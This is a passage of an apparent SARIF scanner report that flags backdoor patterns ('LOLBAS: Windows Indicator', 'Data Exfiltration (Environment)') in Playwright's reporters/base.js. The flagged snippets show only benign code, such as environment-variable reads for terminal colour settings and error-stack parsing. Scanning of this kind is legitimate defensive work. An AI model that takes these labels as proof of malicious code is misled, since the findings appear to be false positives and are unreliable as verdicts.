                    "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                    "rendered": {
                      "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                      "markdown": "`etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 467,
                  "startColumn": 67,
                  "endLine": 467,
                  "endColumn": 71,
                  "snippet": {
                    "text": "}\nfunction prepareErrorStack(stack) {\n  const lines = stack.split('\\n');\n  let firstStackLine = lines.findIndex(line => line.startsWith('    at '));\n  if (firstStackLine === -1) firstStackLine = lines.length;\n  const message = lines.slice(0, firstStackLine).join('\\n');\n  const stackLines = lines.slice(firstStackLine);\n",
                    "rendered": {
                      "text": "}\nfunction prepareErrorStack(stack) {\n  const lines = stack.split('\\n');\n  let firstStackLine = lines.findIndex(line => line.startsWith('    at '));\n  if (firstStackLine === -1) firstStackLine = lines.length;\n  const message = lines.slice(0, firstStackLine).join('\\n');\n  const stackLines = lines.slice(firstStackLine);\n",
                      "markdown": "`}\nfunction prepareErrorStack(stack) {\n  const lines = stack.split('\\n');\n  let firstStackLine = lines.findIndex(line => line.startsWith('    at '));\n  if (firstStackLine === -1) firstStackLine = lines.length;\n  const message = lines.slice(0, firstStackLine).join('\\n');\n  const stackLines = lines.slice(firstStackLine);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 36,
                  "endLine": 125,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    const projectName = test.titlePath()[1];\n    const relativePath = relativeTestPath(this.config, test);\n    const fileAndProject = (projectName ? `[${projectName}] › ` : '') + relativePath;\n    const entry = this.fileDurations.get(fileAndProject) || {\n      duration: 0,\n      workers: new Set()\n    };\n",
                    "rendered": {
                      "text": "    const projectName = test.titlePath()[1];\n    const relativePath = relativeTestPath(this.config, test);\n    const fileAndProject = (projectName ? `[${projectName}] › ` : '') + relativePath;\n    const entry = this.fileDurations.get(fileAndProject) || {\n      duration: 0,\n      workers: new Set()\n    };\n",
                      "markdown": "`    const projectName = test.titlePath()[1];\n    const relativePath = relativeTestPath(this.config, test);\n    const fileAndProject = (projectName ? `[${projectName}] › ` : '') + relativePath;\n    const entry = this.fileDurations.get(fileAndProject) || {\n      duration: 0,\n      workers: new Set()\n    };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 545,
                  "startColumn": 133,
                  "endLine": 545,
                  "endColumn": 144,
                  "snippet": {
                    "text": "solveReporterOutputPath)(options.default.outputDir, options.configDir, undefined);\n  if (!outputFile) {\n    var _ref, _options$fileName, _options$default, _outputDir;\n    const reportName = (_ref = (_options$fileName = options.fileName) !== null && _options$fileName !== void 0 ? _options$fileName : process.env[`PLAYWRIGHT_${name}_OUTPUT_NAME`]) !== null && _ref !== void 0 ? _ref : (_options$default = options.default) === null || _options$default === void 0 ? void 0 : _options$default.fileName;\n    if (!reportName) return undefined;\n    outputFile = _path.default.resolve((_outputDir = outputDir) !== null ",
                    "rendered": {
                      "text": "solveReporterOutputPath)(options.default.outputDir, options.configDir, undefined);\n  if (!outputFile) {\n    var _ref, _options$fileName, _options$default, _outputDir;\n    const reportName = (_ref = (_options$fileName = options.fileName) !== null && _options$fileName !== void 0 ? _options$fileName : process.env[`PLAYWRIGHT_${name}_OUTPUT_NAME`]) !== null && _ref !== void 0 ? _ref : (_options$default = options.default) === null || _options$default === void 0 ? void 0 : _options$default.fileName;\n    if (!reportName) return undefined;\n    outputFile = _path.default.resolve((_outputDir = outputDir) !== null ",
                      "markdown": "`solveReporterOutputPath)(options.default.outputDir, options.configDir, undefined);\n  if (!outputFile) {\n    var _ref, _options$fileName, _options$default, _outputDir;\n    const reportName = (_ref = (_options$fileName = options.fileName) !== null && _options$fileName !== void 0 ? _options$fileName : process.env[`PLAYWRIGHT_${name}_OUTPUT_NAME`]) !== null && _ref !== void 0 ? _ref : (_options$default = options.default) === null || _options$default === void 0 ? void 0 : _options$default.fileName;\n    if (!reportName) return undefined;\n    outputFile = _path.default.resolve((_outputDir = outputDir) !== null `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 523,
                  "startColumn": 16,
                  "endLine": 523,
                  "endColumn": 27,
                  "snippet": {
                    "text": "  return file.includes(`${_path.default.sep}node_modules${_path.default.sep}`);\n}\nfunction resolveFromEnv(name) {\n  const value = process.env[name];\n  if (value) return _path.default.resolve(process.cwd(), value);\n  return undefined;\n}\n",
                    "rendered": {
                      "text": "  return file.includes(`${_path.default.sep}node_modules${_path.default.sep}`);\n}\nfunction resolveFromEnv(name) {\n  const value = process.env[name];\n  if (value) return _path.default.resolve(process.cwd(), value);\n  return undefined;\n}\n",
                      "markdown": "`  return file.includes(`${_path.default.sep}node_modules${_path.default.sep}`);\n}\nfunction resolveFromEnv(name) {\n  const value = process.env[name];\n  if (value) return _path.default.resolve(process.cwd(), value);\n  return undefined;\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 209,
                  "endLine": 60,
                  "endColumn": 220,
                  "snippet": {
                    "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                    "rendered": {
                      "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                      "markdown": "`    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 181,
                  "endLine": 60,
                  "endColumn": 192,
                  "snippet": {
                    "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                    "rendered": {
                      "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                      "markdown": "`    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 117,
                  "endLine": 60,
                  "endColumn": 128,
                  "snippet": {
                    "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                    "rendered": {
                      "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                      "markdown": "`    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 82,
                  "endLine": 60,
                  "endColumn": 93,
                  "snippet": {
                    "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                    "rendered": {
                      "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                      "markdown": "`    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 42,
                  "endLine": 60,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                    "rendered": {
                      "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                      "markdown": "`    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 6,
                  "endLine": 60,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                    "rendered": {
                      "text": "    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n",
                      "markdown": "`    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n  if (process.env.DEBUG_COLORS === '0' || process.env.DEBUG_COLORS === 'false' || process.env.FORCE_COLOR === '0' || process.env.FORCE_COLOR === 'false') useColors = false;else if (process.env.DEBUG_COLORS || process.env.FORCE_COLOR) useColors = true;\n  const colors = useColors ? _utilsBundle.colors : {\n    bold: t => t,\n    cyan: t => t,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 16,
                  "endLine": 56,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n    isTTY = true;\n    ttyWidth = +process.env.PLAYWRIGHT_FORCE_TTY;\n    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n",
                    "rendered": {
                      "text": "    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n    isTTY = true;\n    ttyWidth = +process.env.PLAYWRIGHT_FORCE_TTY;\n    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n",
                      "markdown": "`    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n    isTTY = true;\n    ttyWidth = +process.env.PLAYWRIGHT_FORCE_TTY;\n    if (isNaN(ttyWidth)) ttyWidth = 100;\n  }\n  let useColors = isTTY;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 13,
                  "endLine": 54,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n    isTTY = true;\n    ttyWidth = +process.env.PLAYWRIGHT_FORCE_TTY;\n    if (isNaN(ttyWidth)) ttyWidth = 100;\n",
                    "rendered": {
                      "text": "  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n    isTTY = true;\n    ttyWidth = +process.env.PLAYWRIGHT_FORCE_TTY;\n    if (isNaN(ttyWidth)) ttyWidth = 100;\n",
                      "markdown": "`  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n    isTTY = true;\n    ttyWidth = +process.env.PLAYWRIGHT_FORCE_TTY;\n    if (isNaN(ttyWidth)) ttyWidth = 100;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 60,
                  "endLine": 51,
                  "endColumn": 71,
                  "snippet": {
                    "text": "  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n",
                    "rendered": {
                      "text": "  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n",
                      "markdown": "`  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 13,
                  "endLine": 51,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n",
                    "rendered": {
                      "text": "  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n",
                      "markdown": "`  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n    isTTY = true;\n    ttyWidth = process.stdout.columns || 100;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 54,
                  "endLine": 48,
                  "endColumn": 65,
                  "snippet": {
                    "text": "} = (() => {\n  let isTTY = !!process.stdout.isTTY;\n  let ttyWidth = process.stdout.columns || 0;\n  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n",
                    "rendered": {
                      "text": "} = (() => {\n  let isTTY = !!process.stdout.isTTY;\n  let ttyWidth = process.stdout.columns || 0;\n  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n",
                      "markdown": "`} = (() => {\n  let isTTY = !!process.stdout.isTTY;\n  let ttyWidth = process.stdout.columns || 0;\n  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/base.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 6,
                  "endLine": 48,
                  "endColumn": 17,
                  "snippet": {
